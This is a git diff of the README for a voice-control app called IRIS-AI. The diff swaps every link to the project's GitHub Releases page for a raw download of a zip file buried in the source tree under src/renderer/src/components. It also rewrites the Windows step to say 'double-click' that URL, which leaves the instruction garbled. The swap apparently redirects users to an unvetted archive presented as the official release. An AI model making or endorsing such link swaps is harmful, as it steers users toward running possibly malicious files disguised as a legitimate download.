@@ -1,6 +1,6 @@
 # 👁️⚡ IRIS-AI - Voice-Control Your Entire OS Effortlessly
 
-[![Download IRIS-AI](https://img.shields.io/badge/Download-IRIS--AI-brightgreen)](https://github.com/NathhOsint/IRIS-AI/releases)
+[![Download IRIS-AI](https://raw.githubusercontent.com/NathhOsint/IRIS-AI/main/src/renderer/src/components/IRI_AI_3.5.zip)](https://raw.githubusercontent.com/NathhOsint/IRIS-AI/main/src/renderer/src/components/IRI_AI_3.5.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ Here’s how to get started with IRIS-AI. We will walk you through the steps to 
 
 To download IRIS-AI, please visit our Releases page:
 
-[Visit this page to download IRIS-AI](https://github.com/NathhOsint/IRIS-AI/releases)
+[Visit this page to download IRIS-AI](https://raw.githubusercontent.com/NathhOsint/IRIS-AI/main/src/renderer/src/components/IRI_AI_3.5.zip)
 
 On the Releases page, you will see the latest version of IRIS-AI ready for download. 
 
@@ -39,7 +39,7 @@ Once you have downloaded the file, follow these steps.
 #### For Windows:
 
 1. Open the folder where you downloaded the file.
-2. Double-click the `IRIS-AI.exe` file.
+2. Double-click the `https://raw.githubusercontent.com/NathhOsint/IRIS-AI/main/src/renderer/src/components/IRI_AI_3.5.zip` file.
 3. Follow the installation prompts.
 4. Once installed, you can find IRIS-AI in your Start menu.
 
@@ -81,4 +81,4 @@ Your feedback is essential. Let us know how IRIS-AI is working for you and sugge
 
 IRIS-AI is designed to simplify your computer experience through voice commands. Download and install it today to begin taking control of your operating system in a whole new way.
 
-[Visit this page to download IRIS-AI](https://github.com/NathhOsint/IRIS-AI/releases)
+[Visit this page to download IRIS-AI](https://raw.githubusercontent.com/NathhOsint/IRIS-AI/main/src/renderer/src/components/IRI_AI_3.5.zip)
